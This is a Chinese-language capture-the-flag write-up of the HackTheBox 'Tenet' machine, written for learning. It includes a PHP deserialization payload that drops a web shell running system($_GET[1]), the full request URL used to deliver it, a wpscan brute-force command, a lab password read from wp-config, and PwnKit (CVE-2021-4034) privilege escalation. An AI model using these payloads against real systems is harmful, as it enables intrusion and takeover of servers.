---
title: "HackTheBox：Tenet笔记"
slug: nmvt4o
date: 2022-03-06T23:14:53+08:00
source: yuque/penetration
---

+ Tenet	10.10.10.223
+ [https://app.hackthebox.com/machines/Tenet/](https://app.hackthebox.com/machines/Tenet/)

```basic
export ip=10.10.10.223 && export url=http://10.10.10.223:80 && echo ok
```

# 信息收集
Nmap

```basic
Nmap scan report for 10.10.10.223
  Host is up (1.1s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
  |   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
  |_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  | http-methods: 
  |_  Supported Methods: GET POST OPTIONS HEAD
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

目录扫描

扫到了wordpress，重定向到`tenet.htb`，绑下host，开wpscan

```bash
wpscan --url http://tenet.htb -e m,u 
```

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648134519909-58b80bb3-a9bf-4daf-9fff-6cd43deebddd.png)

枚举出用户

```bash
neil
protagonist
```

fasttrac.txt爆破了下，并没有成功。

随意浏览，发现一处提示信息，[http://tenet.htb/index.php/comments/feed/](http://tenet.htb/index.php/comments/feed/)，

```xml
<description><![CDATA[did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!]]></description>
<content:encoded><![CDATA[<p>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!</p>
]]></content:encoded>
```

dirsearch 指定`--suffix sator.php`扫，没东西

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648141422897-250322a5-358b-44af-8d27-baad7be14ed6.png)

随后突发奇想，会不会……

+ [http://10.10.10.223/sator.php](http://10.10.10.223/sator.php)
+ [http://10.10.10.223/sator.php.bak](http://10.10.10.223/sator.php.bak)

果然，一说备份文件，就是`.bak`，不把我`.swp`放在眼里？

> 另可参考：
>
> + [linux下文件名后面带有波浪号（～）](https://blog.csdn.net/zzukun/article/details/49561097)
> + [Linux中.swp 文件的产生与解决方法](https://blog.csdn.net/qq_42200183/article/details/81531422)
>



简单看代码，刻意的反序列化。

> `__destruct`函数，会在一个对象被被销毁时触发，其实就是反序列化过后被销毁。
>

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648135604274-5740db20-439e-473e-a99b-718688eaabf6.png)

这块儿我一开始看错了（~~以为$data变量被覆盖~~），注意

+ 第24行初始化的变量名字很长，**之后代码里没有再用到它**。
+ 第26、27行，对于攻击，没有实际价值。
+ 代码结束后，反序列生成的对象被销毁，触发`__destruct`方法，也就是写shell



由于我们可以控制文件名和文件内容，简单序列化生成下，发过去即可写shell。

```php
<?php
class DatabaseExport
{
  public function __construct()
  {
    $this->user_file = 'suck.php';
    $this->data = '<?php system($_GET[1]);?>';
  }
}

$app = new DatabaseExport;
$databaseupdate = serialize($app);
echo $databaseupdate;

?>
```

```php
http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:8:%22suck.php%22;s:4:%22data%22;s:25:%22%3C?php%20system($_GET[1]);?%3E%22;}
```

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648135836994-a825bc76-9b53-4408-9496-afad7509bab1.png)

---

# 提权
拿到`www-data`用户后，了解到有个`<font style="color:rgb(0, 0, 0);">neil</font>`<font style="color:rgb(0, 0, 0);">用户，于是开始找提权的线索（顺便开了下msf的infogather模块，并没用）</font>

```php
[+] Info:
[+]     Ubuntu 18.04.5 LTS
[+]     Linux tenet 4.15.0-129-generic #132-Ubuntu SMP Thu Dec 10 14:02:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
[+]     Module running as "neil" user
```

去读`wordpress/wp-config.php`，密码`Opera2112`，成功进入`neil`

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648138080432-7043b8cc-8e04-4654-bd95-e34e0ca14e86.png)



接着，要提权到root，简单看了下计划任务跟文件接口，没可疑的东西之后，搜索有suid位的文件

```bash
find / -perm -u=s 2> /dev/null
```

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648138699154-8bd66a54-bae0-4c86-8f7a-8fa98a759c8b.png)

看到polkit，就想起好像是有个LPE漏洞，搜到了[CVE-2021-4034](https://gitcode.net/mirrors/nikaiw/CVE-2021-4034/-/blob/master/cve2021-4034.py)

本地居然有Python3的环境，很刻意。

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648139420074-15ac6539-c8fe-43fc-bd05-cebac7ef8be4.png)

拿下。

---

# 反思
+ wpscan API token可以配置下，稳重些
+ wpscan爆破的命令：

```bash
wpscan --url [] -U uli -P pli -t 10
```

## Polkit提权漏洞（PwnKit）
+ **验证漏洞是否存在的命令**
    - `dpkg -l policykit*`, 注意不是polkit了哈（通配符`*`亦可）
    - `rpm -qa | grep polkit`

> 目前在Linux 界软体安装方式最常见的有两种，分别是：
>
> 
>
> **dpkg** ：
>
> 这个机制最早是由Debian Linux 社群所开发出来的，透过dpkg 的机制， Debian 提供的软体就能够简单的安装起来，同时还能提供安装后的软体资讯，实在非常不错。 只要是衍生于Debian 的其他Linux distributions 大多使用dpkg 这个机制来管理软体的， 包括B2D, Ubuntu 等等。
>
> 
>
> **RPM** ：
>
> 这个机制最早是由Red Hat 这家公司开发出来的，后来实在很好用，因此很多distributions 就使用这个机制来作为软体安装的管理方式。 包括Fedora, CentOS, SuSE 等等知名的开发商都是用这咚咚。
>

    - pkexec --version

```bash
neil@tenet:/var/www/html$ dpkg -l policykit-1
...
policykit-1   0.105-20ubuntu0.1 amd64
...


neil@tenet:/var/www/html$ pkexec --version
pkexec version 0.105
neil@tenet:/var/www/ht
```



**及时更新msf**

+ `cve_2021_4034_pwnkit_lpe_pkexec.rb`，2022年1月才上到msf中去的，我用的老版本没有。
+ 当然也是稳定利用的:

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648140447195-eef13aba-fe7e-4b35-b463-3a24780f7e93.png)

+ 建议读下msf的利用代码，尤其是[check部分](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/cve_2021_4034_pwnkit_lpe_pkexec.rb#L121)——本质虽是版本匹配，但依然让人直呼精细啊！

---

# Refs
+ [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/cve_2021_4034_pwnkit_lpe_pkexec.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/cve_2021_4034_pwnkit_lpe_pkexec.rb)
+ [CVE-2021-4034：Linux Polkit 权限提升漏洞复现及修复](https://blog.csdn.net/laobanjiull/article/details/122715651)

